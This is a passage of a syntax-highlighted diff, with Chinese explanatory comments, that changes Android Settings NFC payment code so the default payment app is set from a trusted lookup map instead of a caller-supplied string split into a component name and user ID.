<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#1E754F;--shiki-dark:#4D9375">        if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">defaultAppInfo </span><span style="color:#AB5959;--shiki-dark:#CB7676">!=</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//userId 拼接</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#1E754F;--shiki-dark:#4D9375">            return</span><span style="color:#B07D48;--shiki-dark:#BD976A"> defaultAppInfo</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">componentName</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">flattenToString</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#AB5959;--shiki-dark:#CB7676">                    +</span><span style="color:#B07D48;--shiki-dark:#BD976A"> defaultAppInfo</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">userHandle</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getIdentifier</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">    								//userHandle.getIdentifier()：所属用户 ID</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#1E754F;--shiki-dark:#4D9375">        return</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">        if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">defaultAppInfo </span><span style="color:#AB5959;--shiki-dark:#CB7676">==</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#1E754F;--shiki-dark:#4D9375"> return</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">        return</span><span style="color:#B07D48;--shiki-dark:#BD976A"> defaultAppInfo</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getKey</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">     </span><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">     @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">     protected</span><span style="color:#AB5959;--shiki-dark:#CB7676"> boolean</span><span style="color:#59873A;--shiki-dark:#80A665"> setDefaultKey</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">String key</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#AB5959;--shiki-dark:#CB7676">        String</span><span style="color:#1e754f;--shiki-dark:#4d9375">[</span><span style="color:#1e754f;--shiki-dark:#4d9375">]</span><span style="color:#B07D48;--shiki-dark:#BD976A"> keys</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> key</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">split</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#1E754F;--shiki-dark:#4D9375">        if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">keys</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">length</span><span style="color:#AB5959;--shiki-dark:#CB7676"> </span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#AB5959;--shiki-dark:#CB7676">=</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 2</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#B07D48;--shiki-dark:#BD976A">            mPaymentBackend</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">setDefaultPaymentApp</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">ComponentName</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">unflattenFromString</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">keys</span><span style="color:#bda437;--shiki-dark:#e6cc77">[</span><span style="color:#2F798A;--shiki-dark:#4C9A91">0</span><span style="color:#bda437;--shiki-dark:#e6cc77">]</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#B07D48;--shiki-dark:#BD976A">                    Integer</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">parseInt</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">keys</span><span style="color:#bda437;--shiki-dark:#e6cc77">[</span><span style="color:#2F798A;--shiki-dark:#4C9A91">1</span><span style="color:#bda437;--shiki-dark:#e6cc77">]</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//keys[0] 被当作 ComponentName</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">    											//keys[1] 被当作 UserId (直接 parseInt)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        PaymentAppInfo</span><span style="color:#B07D48;--shiki-dark:#BD976A"> appInfo</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mAppInfos</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">get</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">key</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//从 mAppInfos映射表中通过Key查找对象</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">        if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">appInfo </span><span style="color:#AB5959;--shiki-dark:#CB7676">==</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#1E754F;--shiki-dark:#4D9375"> return</span><span style="color:#1E754F;--shiki-dark:#4D9375"> true</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B07D48;--shiki-dark:#BD976A">        mPaymentBackend</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">setDefaultPaymentApp</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">    				//使用对象内部存储的受信任的 ComponentName 和 UserId</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B07D48;--shiki-dark:#BD976A">                appInfo</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">componentName</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B07D48;--shiki-dark:#BD976A"> appInfo</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">userHandle</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getIdentifier</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">         return</span><span style="color:#1E754F;--shiki-dark:#4D9375"> true</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">     </span><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">90</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">7</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">89</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">9</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">     public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> onAttach</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Context context</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#C99076">         super</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">onAttach</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">context</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">         mPaymentBackend </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#59873A;--shiki-dark:#80A665"> PaymentBackend</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#59873A;--shiki-dark:#80A665">getActivity</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        mAppInfos </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mPaymentBackend</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getPaymentAppInfos</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        mAppInfos </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mPaymentBackend</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getPaymentAppInfos</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">stream</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">collect</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">Collectors</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">toMap</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">PaymentAppInfo</span><span style="color:#1E754F;--shiki-dark:#4D9375">::</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">getKey</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B07D48;--shiki-dark:#BD976A"> Function</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">identity</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">     </span><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">     @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">147</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">7</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">148</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">7</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">     @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">     protected</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> List</span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">?</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> extends CandidateInfo</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#59873A;--shiki-dark:#80A665"> getCandidates</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:rgba(255, 18, 18, 0.8);--shiki-dark:rgba(255, 18, 18, 0.8)">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">         final</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> List</span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#AB5959;--shiki-dark:#CB7676">NfcPaymentCandidateInfo</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span><span style="color:#B07D48;--shiki-dark:#BD976A"> candidates</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> ArrayList</span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#1E754F;--shiki-dark:#4D9375">        for</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">PaymentAppInfo</span><span style="color:#B07D48;--shiki-dark:#BD976A"> appInfo</span><span style="color:#1E754F;--shiki-dark:#4D9375">:</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> mAppInfos</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:rgba(255, 18, 18, 0.8);--shiki-dark:rgba(255, 18, 18, 0.8)">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">        for</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">PaymentAppInfo</span><span style="color:#B07D48;--shiki-dark:#BD976A"> appInfo</span><span style="color:#1E754F;--shiki-dark:#4D9375">:</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mAppInfos</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">values</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:rgba(255, 18, 18, 0.8);--shiki-dark:rgba(255, 18, 18, 0.8)">{</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//Map → 遍历 value</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">             UserManager</span><span style="color:#B07D48;--shiki-dark:#BD976A"> um</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#59873A;--shiki-dark:#80A665"> getContext</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">createContextAsUser</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//切换到该支付 App 所属用户</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">                     appInfo</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">userHandle</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> /*flags=*/</span><span style="color:#2F798A;--shiki-dark:#4C9A91">0</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getSystemService</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">UserManager</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">class</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">             boolean</span><span style="color:#B07D48;--shiki-dark:#BD976A"> isManagedProfile</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> um</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">isManagedProfile</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">appInfo</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">userHandle</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getIdentifier</span><span style="color:#bda437;--shiki-dark:#e6cc77">(</span><span style="color:#bda437;--shiki-dark:#e6cc77">)</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span></code></pre>
<p>2.PaymentBackend.java</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">36</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">6</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">36</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">7</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375"> import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> java</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ArrayList</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375"> import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> java</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">List</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> java</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Objects</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676"> public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> class</span><span style="color:#2E8F82;--shiki-dark:#5DA994"> PaymentBackend</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">     public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> static</span><span style="color:#AB5959;--shiki-dark:#CB7676"> final</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> String</span><span style="color:#B07D48;--shiki-dark:#BD976A"> TAG</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Settings.PaymentBackend</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">52</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">6</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">53</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">24</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">         public</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> ComponentName</span><span style="color:#B07D48;--shiki-dark:#BD976A"> settingsComponent</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">         public</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> UserHandle</span><span style="color:#B07D48;--shiki-dark:#BD976A"> userHandle</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//支付 App 属于哪个 Android 用户</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">         public</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> Drawable</span><span style="color:#B07D48;--shiki-dark:#BD976A"> icon</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">        public</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> String </span><span style="color:#59873A;--shiki-dark:#80A665">getKey</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">            return</span><span style="color:#B07D48;--shiki-dark:#BD976A"> Integer</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">toString</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#59873A;--shiki-dark:#80A665">hashCode</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">        @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
